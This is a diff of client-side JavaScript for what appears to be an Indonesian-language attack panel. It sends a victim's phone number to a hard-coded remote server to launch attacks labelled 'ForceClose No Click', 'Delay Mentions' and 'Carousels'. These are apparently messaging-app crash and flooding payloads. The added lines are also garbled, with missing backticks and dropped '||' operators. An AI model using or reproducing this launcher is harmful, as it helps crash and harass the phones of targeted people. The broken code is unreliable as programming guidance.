@@ -205,9 +205,9 @@
       }
       statusEl.textContent = '⏳ Mengirim ForceClose No Click...';
       try {
-        const res = await fetch(`http://143.198.177.1:4007/api/bug/fc?target=${phone}`);
+        const res = await fetch(http://143.198.177.1:4007/api/fc?target=${phone});
         const data = await res.json();
-        statusEl.textContent = data.status ? '✅ ForceClose Succes Sending' : `⚠️ Gagal: ${data.message || data.error || 'Unknown'}`;
+        statusEl.textContent = data.status ? '✅ ForceClose Succes Sending' : ⚠️ Gagal: ${data.message  data.error  'Unknown'};
       } catch (err) {
         console.error(err);
         statusEl.textContent = '🚫 Gagal terhubung ke API';
@@ -222,9 +222,9 @@
       }
       statusEl.textContent = '⏳ Mengirim Delay Mentions...';
       try {
-        const res = await fetch(`http://143.198.177.1:4007/api/bug/delay?target=${phone}`);
+        const res = await fetch(http://143.198.177.1:4007/api/delay?target=${phone});
         const data = await res.json();
-        statusEl.textContent = data.status ? '✅ Delay berhasil!' : `⚠️ Gagal: ${data.message || data.error || 'Unknown'}`;
+        statusEl.textContent = data.status ? '✅ Delay berhasil!' : ⚠️ Gagal: ${data.message  data.error  'Unknown'};
       } catch (err) {
         console.error(err);
         statusEl.textContent = '🚫 Gagal terhubung ke API';
@@ -238,9 +238,9 @@
       }
       statusEl.textContent = '⏳ Mengirim Carousels...';
       try {
-        const res = await fetch(`http://143.198.177.1:4007/api/bug/carousel?target=${phone}`);
+        const res = await fetch(http://143.198.177.1:4007/api/carousel?target=${phone});
         const data = await res.json();
-        statusEl.textContent = data.status ? '✅ Carousels berhasil!' : `⚠️ Gagal: ${data.message || data.error || 'Unknown'}`;
+        statusEl.textContent = data.status ? '✅ Carousels berhasil!' : ⚠️ Gagal: ${data.message  data.error  'Unknown'};
       } catch (err) {
         console.error(err);
         statusEl.textContent = '🚫 Gagal terhubung ke API';
